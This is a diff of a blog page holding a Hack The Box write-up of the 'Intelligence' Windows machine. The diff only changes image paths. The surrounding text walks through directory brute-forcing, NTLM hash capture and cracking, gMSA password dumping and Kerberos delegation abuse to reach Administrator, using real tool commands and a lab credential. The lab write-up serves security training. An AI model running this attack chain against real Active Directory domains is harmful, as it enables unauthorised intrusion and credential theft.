@@ -241,7 +241,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
  tion a successful bind must be completed on the connection., data 0, v4563
 
 # numResponses: 1
-</code></pre><ul><li>Web Server<ul><li><code>contact@intelligence.htb</code></li><li><code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></li><li><code>http://intelligence.htb/documents/2020-12-15-upload.pdf</code></li></ul></li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://intelligence.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error
+</code></pre><ul><li>Web Server<ul><li><code>contact@intelligence.htb</code></li><li><code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></li><li><code>http://intelligence.htb/documents/2020-12-15-upload.pdf</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://intelligence.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -582,7 +582,7 @@ try {
 [+] Bind OK
 [-] Adding new record
 [+] LDAP operation completed successfully
-</code></pre><ul><li>Now we wait</li></ul><p><img src=./images/2.png></p><ul><li>Let&rsquo;s crack the hash</li></ul><pre tabindex=0><code>└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+</code></pre><ul><li>Now we wait</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/2.png></p><ul><li>Let&rsquo;s crack the hash</li></ul><pre tabindex=0><code>└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 ...
 
@@ -612,7 +612,7 @@ Stopped: Wed Sep  6 19:22:26 2023
 </code></pre><ul><li>And it works</li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy                    
 SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
-</code></pre><h2 id=root>Root</h2><ul><li>Now we can check <code>bloodhound</code><ul><li><code>bloodhound-python -c all -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --zip</code></li></ul></li></ul><p><img src=./images/3.png></p><p><img src=./images/4.png></p><ul><li>We have a <code>ReadGMSAPassword</code> rights over <code>svc_int</code> which has delegation to <code>dc.intelligence.htb</code><ul><li><a href=https://learn.microsoft.com/en-us/azure/active-directory/architecture/service-accounts-group-managed target=_blank rel=noopener>Group managed service accounts (gMSAs)</a><ul><li><code>gMSAs can run on one server, or in a server farm, such as systems behind a network load balancing or Internet Information Services (IIS) server. After you configure your services to use a gMSA principal, account password management is handled by the Windows operating system (OS)</code></li></ul></li><li><a href=https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword target=_blank rel=noopener>https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword</a></li><li>Let&rsquo;s get the <code>hash</code> using <a href=https://github.com/micahvandeusen/gMSADumper target=_blank rel=noopener>gMSADumper</a></li></ul></li></ul><pre tabindex=0><code>└─$ python3 gMSADumper.py -u &#39;Ted.Graves&#39; -p &#39;Mr.Teddy&#39; -d intelligence.htb -l 10.10.10.248
+</code></pre><h2 id=root>Root</h2><ul><li>Now we can check <code>bloodhound</code><ul><li><code>bloodhound-python -c all -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --zip</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/3.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/4.png></p><ul><li>We have a <code>ReadGMSAPassword</code> rights over <code>svc_int</code> which has delegation to <code>dc.intelligence.htb</code><ul><li><a href=https://learn.microsoft.com/en-us/azure/active-directory/architecture/service-accounts-group-managed target=_blank rel=noopener>Group managed service accounts (gMSAs)</a><ul><li><code>gMSAs can run on one server, or in a server farm, such as systems behind a network load balancing or Internet Information Services (IIS) server. After you configure your services to use a gMSA principal, account password management is handled by the Windows operating system (OS)</code></li></ul></li><li><a href=https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword target=_blank rel=noopener>https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword</a></li><li>Let&rsquo;s get the <code>hash</code> using <a href=https://github.com/micahvandeusen/gMSADumper target=_blank rel=noopener>gMSADumper</a></li></ul></li></ul><pre tabindex=0><code>└─$ python3 gMSADumper.py -u &#39;Ted.Graves&#39; -p &#39;Mr.Teddy&#39; -d intelligence.htb -l 10.10.10.248
 Users or groups who can read password for svc_int$:
  &gt; DC$
  &gt; itsupport
@@ -639,7 +639,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*]     Requesting S4U2Proxy
 [*] Saving ticket in Administrator.ccache
 </code></pre><ul><li>Now export the ticket and connect with <code>psexec</code> or <code>wmiexec</code></li></ul><pre tabindex=0><code>└─$ export KRB5CCNAME=./Administrator.ccache
-</code></pre><p><img src=./images/5.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/5.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fintelligence%2f&text=%5bHTB%5d%20Machine%3a%20Intelligence&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fintelligence%2f&title=%5bHTB%5d%20Machine%3a%20Intelligence" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fintelligence%2f&title=%5bHTB%5d%20Machine%3a%20Intelligence" target=_blank><i class="fab fa-linkedin"></i>
